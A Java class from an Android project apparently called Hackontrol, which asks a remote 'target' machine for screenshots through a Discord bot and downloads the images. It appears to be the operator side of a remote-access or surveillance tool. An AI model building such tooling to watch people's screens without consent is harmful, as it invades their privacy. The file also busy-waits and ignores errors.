package com.khopan.hackontrol;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;

import java.io.InputStream;

import net.dv8tion.jda.api.entities.Message.Attachment;

public class Target {
	private final Hackontrol hackontrol;
	private final MachineId identifier;

	boolean connected;

	private volatile Bitmap image;

	public Target(Hackontrol hackontrol, MachineId identifier) {
		this.hackontrol = hackontrol;
		this.identifier = identifier;
		this.connected = true;
	}

	public MachineId getMachineIdentifier() {
		return this.identifier;
	}

	public Bitmap screenshot() {
		this.check();
		this.image = null;
		this.hackontrol.request.screenshot();
		while(this.image == null) {}
		return this.image;
	}

	void screenshotTaken(Attachment attachment) {
		new Thread(() -> {
			Bitmap image;

			try {
				InputStream stream = attachment.getProxy().download().get();
				image = BitmapFactory.decodeStream(stream);
			} catch(Throwable ignored) {
				return;
			}

			this.image = image;
		}).start();
	}

	private void check() {
		if(!this.connected) {
			throw new IllegalStateException("Target was disconnected!");
		}
	}
}
